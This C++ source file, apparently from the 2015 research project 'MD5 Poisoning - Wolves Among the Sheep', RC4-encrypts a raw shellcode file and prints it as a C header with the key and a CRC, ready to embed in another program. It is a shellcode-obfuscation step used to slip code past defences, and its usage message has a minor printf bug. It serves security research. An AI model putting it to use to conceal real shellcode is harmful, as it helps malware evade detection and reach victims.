/*
MD5 Poisoning - Wolves Among the Sheep
Copyright (C) 2015  Bálint Varga-Perke

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "stdafx.h"
#include "rc4.h"
#include "crc.h"
#include<iostream>
#include<fstream>
#include<string>

int main(int argc, char* argv[])
{
	if (argc<3){
		printf("Usage: %s [KEY] [shellcode.raw]\n");
		return -1;
	}

	unsigned char* key=(unsigned char*)argv[1];
	std::ifstream in(argv[2]);
	
	std::string contents((std::istreambuf_iterator<char>(in)),std::istreambuf_iterator<char>());
	
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char* crypted=(unsigned char*)malloc(contents.length()*sizeof(unsigned char));
	memset(crypted,0,contents.length()*sizeof(unsigned char));
	rc4_crypt(crypted,contents.length(),&rc4_key);
	
	printf("#define SC {");
	for (int i=0;i<contents.length();i++){
		if (i!=0) putchar(',');
		printf("0x%02x",(unsigned char)((unsigned char)(contents.c_str()[i])^crypted[i]));
	}
	printf("}\n\n");
	// Calculating CRC
	const unsigned char * contents_buf = reinterpret_cast<const unsigned char *> (contents.c_str());
	printf("#define SC_KEY \"%s\"\n\n",key);
	printf("#define SC_CRC %d \n\n",crcSlow(contents_buf,contents.length()));
	return 0;
}

